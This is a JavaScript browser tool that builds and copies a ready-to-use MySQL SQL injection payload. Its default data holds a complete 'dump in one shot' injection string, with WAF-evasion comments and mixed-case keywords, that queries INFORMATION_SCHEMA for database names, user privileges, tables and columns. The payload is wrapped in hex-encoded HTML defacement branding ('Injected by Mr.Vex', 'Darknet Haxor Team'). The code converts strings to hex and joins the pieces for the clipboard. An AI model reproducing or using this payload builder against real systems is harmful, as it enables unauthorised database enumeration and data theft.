// Function to convert string to hex
function stringToHex(str) {
    let hex = '0x';
    for (let i = 0; i < str.length; i++) {
        const charCode = str.charCodeAt(i).toString(16).padStart(2, '0');
        hex += charCode;
    }
    return hex;
}

// Function to set data in Local Storage
function setLocalStorage(name, value) {
    try {
        localStorage.setItem(name, value);
        console.log(`Local Storage set: ${name}=${value}`);
    } catch (e) {
        console.error('Failed to set Local Storage:', e);
        showToast('Failed to save data to Local Storage.', true);
    }
}

// Function to get data from Local Storage
function getLocalStorage(name) {
    try {
        const value = localStorage.getItem(name);
        if (value) {
            console.log(`Local Storage retrieved: ${name}=${value}`);
            return value;
        }
        console.log(`Local Storage not found: ${name}`);
        return null;
    } catch (e) {
        console.error('Failed to get Local Storage:', e);
        return null;
    }
}

// Function to load data from Local Storage
function loadData() {
    // Try localStorage first
    let data = getLocalStorage('array');
    if (data) {
        try {
            const parsed = JSON.parse(data);
            if (Array.isArray(parsed)) {
                console.log('Loaded data from Local Storage:', parsed);
                return parsed;
            } else {
                console.error('Local Storage data is not an array');
            }
        } catch (e) {
            console.error('Invalid Local Storage data:', e);
        }
    }

    // Default data if localStorage fails
    console.log('Using default data');
    return [
        { type: "comment", value: "/*!50000concat/**Darknet-Haxor**/*/(0x223e273e3c2f7469746c653e" },
        { type: "pair", hex: "0x3c6c696e6b2072656c3d227374796c6573686565742220687265663d5c2268747470733a2f2f6b696d65747375616e647265612e6769746875622e696f2f70726f66696c652f6173736574732f6373732f666f6e74732e6373732220747970653d22746578742f637373223e", string: "<link rel=\"stylesheet\" href=\"https://kimetsuandrea.github.io/profile/assets/css/fonts.css\" type=\"text/css\">" },
        { type: "pair", hex: "0x3c62723e3c62723e3c2f666f6e743e3c7461626c6520626f726465723d2235223e3c74686561643e3c74723e3c746820636f6c7370616e3d2232223e3c6469762069643d2267756172646972616e2d6c6f676f223e3c696d6720647261676761626c653d2266616c736522207372633d2268747470733a2f2f692e696d6775722e636f6d2f576271385454432e6a706567222077696474683d31303030206865696768743d33303020616c743d22564f4944534543204841434b4552532e223e3c2f6469763e3c72207374796c653d22636f6c6f723a426c61636b223e564f4944534543204f52472e3c2f723e3c2f74683e3c2f74723e3c74723e3c746820636f6c7370616e3d2232223e3c683320616c69676e3d2263656e746572223e3c6e3e203c693e3c6d207374796c653d22636f6c6f723a726564223e496e6a656374656420627920", string: "<br><br></font><table border=\"5\"><thead><tr><th colspan=\"2\"><div id=\"guardiran-logo\"><img draggable=\"false\" src=\"https://i.imgur.com/Wbq8TTC.jpeg\" width=1000 height=300 alt=\"VOIDSEC HACKERS.\"></div><r style=\"color:Black\">VOIDSEC ORG.</r></th></tr><tr><th colspan=\"2\"><h3 align=\"center\"><n> <i><m style=\"color:red\">Injected by " },
        { type: "pair", hex: "0x3c2f6e3e3c693e3c6d207374796c653d22636f6c6f723a726564223e4d722e5665783c2f6d3e3c2f6d3e3c2f693e", string: "</n><i><m style=\"color:red\">Mr.Vex</m></m></i>" },
        { type: "pair", hex: "0x3c2f68333e3c2f74683e3c2f74723e", string: "</h3></th></tr>" },
        { type: "pair", hex: "0x3c74723e3c746820636f6c7370616e3d2232223e3c64697620616c69676e3d226c656674223e3c666f6e7420636f6c6f723d677265656e3e3c6e3e56657273696f6e202d2d3e3c2f6e3e3c666f6e7420636f6c6f723d626c75653e", string: "<tr><th colspan=\"2\"><div align=\"left\"><font color=green><n>Version --></n><font color=blue>" },
        { type: "comment", value: "/*!50000VerSiOn/**xnxx**/*/()" },
        { type: "pair", hex: "0x3c2f74683e3c2f74723e", string: "</th></tr>" },
        { type: "pair", hex: "0x3c74723e3c746820636f6c7370616e3d2232223e3c64697620616c69676e3d226c656674223e3c666f6e7420636f6c6f723d677265656e3e3c6e3e55736572202d2d3e3c2f6e3e3c666f6e7420636f6c6f723d626c75653e", string: "<tr><th colspan=\"2\"><div align=\"left\"><font color=green><n>User --></n><font color=blue>" },
        { type: "comment", value: "/*!50000UsEr/**Darknet-Haxor**/*/()" },
        { type: "pair", hex: "0x3c2f74683e3c2f74723e", string: "</th></tr>" },
        { type: "pair", hex: "0x3c74723e3c746820636f6c7370616e3d2232223e3c64697620616c69676e3d226c656674223e3c666f6e7420636f6c6f723d677265656e3e3c6e3e4461746162617365202d2d3e3c2f6e3e3c666f6e7420636f6c6f723d626c75653e", string: "<tr><th colspan=\"2\"><div align=\"left\"><font color=green><n>Database --></n><font color=blue>" },
        { type: "comment", value: "/*!50000DaTabaSe/**Darknet-Haxor**/*/()" },
        { type: "pair", hex: "0x3c2f74683e3c2f74723e", string: "</th></tr>" },
        { type: "pair", hex: "0x3c74723e3c746820636f6c7370616e3d2232223e3c64697620616c69676e3d2263656e746572223e3c666f6e7420636f6c6f723d7265643e3c6e3e546f74616c2044617461626173653c2f6e3e3c2f74723e3c2f74683e3c74723e3c746820636f6c7370616e3d2232223e", string: "<tr><th colspan=\"2\"><div align=\"center\"><font color=red><n>Total Database</n></tr></th><tr><th colspan=\"2\">" },
        { type: "comment", value: "(SeLECT(@w)/*!50000FrOM/**Darknet-Haxor**/*/(/*!50000SeLECT/**xnxx**/*/(@w:=0x00)" },
        { type: "comment", value: "(SeLECT(@w)/*!50000FrOM/**Darknet-Haxor**/*/(/*!50000InFOrMATIoN_SChEmA/**Darknet-Haxor**/*/.SCheMaTA)/*!50000WhErE/**Darknet-Haxor**/*/(@w)IN(@w:=/*!50000CoNCaT/**Darknet-Haxor**/*/(0x20,@w" },
        { type: "pair", hex: "0x3c64697620616c69676e3d226c656674223e3c666f6e7420636f6c6f723d626c75653e", string: "<div align=\"left\"><font color=blue>" },
        { type: "comment", value: "/*!50000sCheMa_NaMe/**Darknet-Haxor**/*/" },
        { type: "comment", value: "0x3c62723e))))w)" },
        { type: "pair", hex: "0x3c2f74683e3c2f74723e3c74723e3c746820636f6c7370616e3d2232223e3c64697620616c69676e3d2263656e746572223e3c666f6e7420636f6c6f723d7265643e3c6e3e557365722050726976696c6567653c2f6e3e3c2f74683e3c2f74723e3c74723e3c746820636f6c7370616e3d2232223e", string: "</th></tr><tr><th colspan=\"2\"><div align=\"center\"><font color=red><n>User Privilege</n></th></tr><tr><th colspan=\"2\">" },
        { type: "comment", value: "(SeLECT(@z)/*!50000FrOM/**Darknet-Haxor**/*/(/*!50000SeLECT/**xnxx**/*/(@z:=0x00)" },
        { type: "comment", value: "(SeLECT(@z)/*!50000FrOM/**Darknet-Haxor**/*/(/*!50000INFOrmATiON_SChEmA/**Darknet-Haxor**/*/.UsER_PRIViLEgES)/*!50000WhERE/**Darknet-Haxor**/*/(@z)IN(@z:=/*!50000CoNCaT/**Darknet-Haxor**/*/(0x20,@z" },
        { type: "comment", value: "0x3c64697620616c69676e3d226c656674223e3c666f6e7420636f6c6f723d626c75653e" },
        { type: "comment", value: "GrANtEE" },
        { type: "pair", hex: "0x202d3e20", string: " -> " },
        { type: "comment", value: "Is_gRANTaBLE" },
        { type: "comment", value: "0x3c62723e))))z)" },
        { type: "pair", hex: "0x3c2f74683e3c2f74723e", string: "</th></tr>" },
        { type: "pair", hex: "0x3c2f74683e3c2f74723e3c74723e3c746820636f6c7370616e3d2232223e3c64697620616c69676e3d2263656e746572223e3c696d6720647261676761626c653d2266616c736522207372633d2268747470733a2f2f6b696d65747375616e647265612e6769746875622e696f2f70726f66696c652f6173736574732f6769662f62616e6e65722e676966222077696474683d343630206865696768743d363020616c743d2244616b726e6574204861786f72205465616d223e3c2f74683e3c2f74723e3c74723e3c74683e3c64697620616c69676e3d2263656e746572223e3c666f6e7420636f6c6f723d7265643e5461626c65204e616d653c2f74683e3c74683e3c64697620616c69676e3d2263656e746572223e3c666f6e7420636f6c6f723d7265643e436f6c756d6e204e616d653c2f74683e3c2f74686561643e3c2f74723e3c74626f64793e", string: "</th></tr><tr><th colspan=\"2\"><div align=\"center\"><img draggable=\"false\" src=\"https://kimetsuandrea.github.io/profile/assets/gif/banner.gif\" width=460 height=60 alt=\"Dakrnet Haxor Team\"></th></tr><tr><th><div align=\"center\"><font color=red>Table Name</th><th><div align=\"center\"><font color=red>Column Name</th></thead></tr><tbody>" },
        { type: "comment", value: "(selEct(@x)/*!50000fRom/**Darknet-Haxor**/*/(/*!50000sElect/**Darknet-Haxor**/*/(@x:=0x00)" },
        { type: "comment", value: "(sElect(0)/*!From/**Darknet-Haxor**/*/(/*!50000inforMation_schEma.coLuMns/**Darknet-Haxor**/*/)/*!50000Where/**Darknet-Haxor**/*/(taBle_schema=/*!50000DatAbase/**Darknet-Haxor**/*/())and(0x00)in(@x:=/*!50000coNcat/**Darknet-Haxor**/*/(@x" },
        { type: "pair", hex: "0x3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d7265642073697a653d333e", string: "</font></td><td><font color=red size=3>" },
        { type: "pair", hex: "0x3c64697620616c69676e3d226c656674223e", string: "<div align=\"left\">" },
        { type: "comment", value: "/*!50000tAble_naMe/**Darknet-Haxor**/*/" },
        { type: "pair", hex: "0x3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d7265642073697a653d333e", string: "</font></td><td><font color=red size=3>" },
        { type: "pair", hex: "0x3c64697620616c69676e3d226c656674223e", string: "<div align=\"left\">" },
        { type: "comment", value: "/*!50000colUmn_naMe/**Darknet-Haxor**/*/" },
        { type: "pair", hex: "0x3c2f666f6e743e3c2f74643e3c2f74723e", string: "</font></td></tr>" },
        { type: "comment", value: "))))x))" }
    ];
}

// Global data array
let data = loadData();

// Function to update storage (use only localStorage)
function updateCookie() {
    try {
        const jsonString = JSON.stringify(data);
        setLocalStorage('array', jsonString);
    } catch (e) {
        console.error('Failed to update storage:', e);
        showToast('Failed to save data.', true);
    }
}

// Function to display all pairs and comments
function displayData() {
    const outputSection = document.getElementById('outputSection');
    outputSection.innerHTML = '';
    let pairIndex = 0;

    data.forEach((item, index) => {
        const div = document.createElement('div');
        if (item.type === 'pair') {
            div.className = 'pair';
            const currentHex = item.hex || stringToHex(item.string);
            div.innerHTML = `
                <div class="hex" id="hex-${pairIndex}">${currentHex}</div>
                <textarea class="string-holder" id="string-${pairIndex}" rows="2">${item.string}</textarea>
            `;
            outputSection.appendChild(div);

            // Add event listener for real-time hex update and storage
            const textarea = div.querySelector(`#string-${pairIndex}`);
            const hexDisplay = div.querySelector(`#hex-${pairIndex}`);
            textarea.addEventListener('input', () => {
                hexDisplay.textContent = stringToHex(textarea.value);
                data[index].string = textarea.value;
                data[index].hex = stringToHex(textarea.value);
                updateCookie();
            });
            pairIndex++;
        } else if (item.type === 'comment') {
            div.className = 'comment';
            div.textContent = item.value;
            outputSection.appendChild(div);
        }
    });
}

// Function to request clipboard permission
async function requestClipboardPermission() {
    try {
        const permissionStatus = await navigator.permissions.query({ name: 'clipboard-write' });
        if (permissionStatus.state === 'granted' || permissionStatus.state === 'prompt') {
            return true;
        }
        await navigator.permissions.request({ name: 'clipboard-write' });
        return (await navigator.permissions.query({ name: 'clipboard-write' })).state === 'granted';
    } catch (err) {
        console.error('Error requesting clipboard permission:', err);
        return false;
    }
}

// Function to copy all hex codes and comments to clipboard
async function copyAllContent() {
    let pairIndex = 0;
    const contentParts = data.map((item) => {
        if (item.type === 'pair') {
            const textarea = document.getElementById(`string-${pairIndex}`);
            pairIndex++;
            return textarea ? stringToHex(textarea.value) : item.hex;
        } else {
            return item.value;
        }
    });

    // Handle comma placement
    let content = contentParts[0];
    for (let i = 1; i < contentParts.length - 1; i++) {
        content += ',' + contentParts[i];
    }
    content += contentParts[contentParts.length - 1];

    try {
        await navigator.clipboard.writeText(content);
        showToast('Hex codes and comments copied to clipboard!');
        updateCookie(); // Update after convert
    } catch (err) {
        console.error('Failed to copy:', err);
        const hasPermission = await requestClipboardPermission();
        if (hasPermission) {
            try {
                await navigator.clipboard.writeText(content);
                showToast('Hex codes and comments copied to clipboard!');
                updateCookie();
            } catch (retryErr) {
                console.error('Retry failed:', retryErr);
                showToast('Failed to copy to clipboard.', true);
            }
        } else {
            showToast('Clipboard permission denied.', true);
        }
    }
}

// Function to show toast notification
function showToast(message = 'Hex codes and comments copied to clipboard!', isError = false) {
    const toast = document.getElementById('toast');
    toast.textContent = message;
    toast.style.backgroundColor = isError ? '#dc3545' : '#333';
    toast.className = 'toast show';
    setTimeout(() => {
        toast.className = 'toast';
    }, 3000);
}

// Initialize on page load
window.onload = () => {
    updateCookie(); // Set Local Storage with loaded/default data
    displayData();
};